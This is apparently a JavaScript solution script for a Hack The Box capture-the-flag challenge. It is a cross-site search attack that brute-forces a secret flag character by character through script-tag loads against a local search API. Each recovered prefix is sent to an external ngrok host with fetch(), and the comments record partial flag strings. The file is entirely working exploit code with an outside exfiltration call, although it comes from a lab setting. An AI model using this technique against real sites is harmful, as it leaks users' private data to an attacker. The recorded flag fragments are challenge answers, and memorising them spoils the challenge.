//let flag = 'HTB{5w33t__li3ndr3n_0'; // init search word
//let flag = "Ba";
//let flag = "HTB_5w33t__li3ndr3n_0f_min3";
let flag = "HTB{";
let ngrok = "d8cf-157-100-198-203.sa.ngrok.io";
let letters = '@!0123456789{}abcdefghijklmnopqrstuvwxyzHTB_';
let url = 'http://127.0.0.1:1337/api/entries/search?q=';


const checkFlag = () => {
    fetch(`http://${ngrok}/flag=${flag}`, {method: "GET"})
}

const loadScript = (char) => {
    return new Promise((res, rej)=>{
        newVal = document.createElement("script")
        newVal.src = "http://127.0.0.1:1337/api/entries/search?q=" + encodeURIComponent(flag + char);
        newVal.id = "exploitScript";
        newVal.onload = ()=> {char == '_' ? rej(): res(char)};
        document.head.appendChild(newVal);
    })
}

async function getFullWord(letters) {
    let b = false;
    for (let i = 0; i < letters.length; i++) {
        loadScript(letters[i]).then((res) => { 
            flag = flag.concat(res);
            checkFlag();
            b = res === '}' ? true : false; i = 0 }, (res)=> { });
        if (b) break;
    }
};
getFullWord(letters);


///flag=HTB_5w33t__
//5w33t__li3ndr3n_0f_min3_
//5w33t__li3ndr3n_0f_min3__
